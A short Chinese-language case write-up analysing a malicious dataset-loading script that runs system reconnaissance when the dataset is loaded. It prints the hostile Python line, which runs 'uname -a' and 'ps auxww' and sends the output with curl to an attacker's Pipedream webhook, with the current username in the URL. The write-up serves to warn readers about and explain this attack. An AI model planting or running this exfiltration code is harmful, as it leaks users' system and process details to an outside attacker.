## 📌 Case 3：操作系统侦察（OS Reconnaissance）
  
**你加载数据集时，脚本偷偷把你电脑的“身份证”和“运行清单”拍照发走。**

---

### 🎯 攻击场景
- **仓库名**：`Yash2998db/stan_small`（数据集）
- **恶意点**：数据集加载脚本 `__init__` 方法里藏了一段系统侦察代码
- **泄露内容**：操作系统版本、内核、正在运行的进程列表
- **外传方式**：用 `curl` 发送到攻击者的 [Pipedream](https://pipedream.net) 临时 webhook

---

### 🔍 恶意代码（核心 3 行）

```python
subprocess.check_output(
    '(uname -a; ps auxww) | curl -s https://eoxvp5idbpacu69.m.pipedream.net/$(whoami) --data-binary @-',
    shell=True
)
```

| 命令 | 作用 |
|------|------|
| `uname -a` | 打印操作系统+内核版本 |
| `ps auxww` | 打印所有进程详细信息 |
| `curl … --data-binary @-` | 把上面两条命令的输出 POST 到攻击者服务器，URL 里还带当前用户名 |


---

### ✅ 一句话总结
> **看似只是加载一个数据集，实际上脚本已经把你电脑“是谁、在跑什么”全都拍照发走了。**